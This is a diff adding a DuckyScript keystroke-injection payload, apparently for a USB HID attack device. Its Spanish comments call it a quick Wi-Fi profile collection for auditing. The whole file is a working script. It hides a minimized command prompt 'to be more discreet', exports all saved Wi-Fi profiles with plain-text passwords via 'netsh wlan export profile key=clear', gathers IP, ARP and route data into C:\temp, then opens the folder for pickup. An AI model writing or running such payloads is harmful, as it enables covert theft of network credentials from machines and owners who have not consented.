@@ -1,0 +1,45 @@
+REM ========================================================
+REM Título: Recolección Rápida de Perfiles Wi-Fi (Auditoría)
+REM Autor: Equipo Técnico NEXORC
+REM Descripción: Abre CMD oculto, exporta los perfiles Wi-Fi
+REM y sus contraseñas a una carpeta temporal para auditoría.
+REM ========================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+
+REM Ejecutar CMD minimizado para ser más discreto
+STRING cmd /c start /min cmd.exe
+ENTER
+DELAY 1000
+
+REM Crear directorio de volcado
+STRING mkdir C:\temp\nexorc_audit
+ENTER
+DELAY 200
+STRING cd C:\temp\nexorc_audit
+ENTER
+DELAY 200
+
+REM Exportar todos los perfiles de red inalámbrica en texto plano (Claves)
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 1500
+
+REM Consolidar la información de IPs y Rutas
+STRING ipconfig /all > ip_info.txt
+ENTER
+STRING arp -a > arp_info.txt
+ENTER
+STRING route print > route_info.txt
+ENTER
+
+REM Abrir la carpeta para recolectar los archivos generados
+STRING explorer C:\temp\nexorc_audit
+ENTER
+DELAY 500
+
+REM Cerrar la consola
+STRING exit
+ENTER
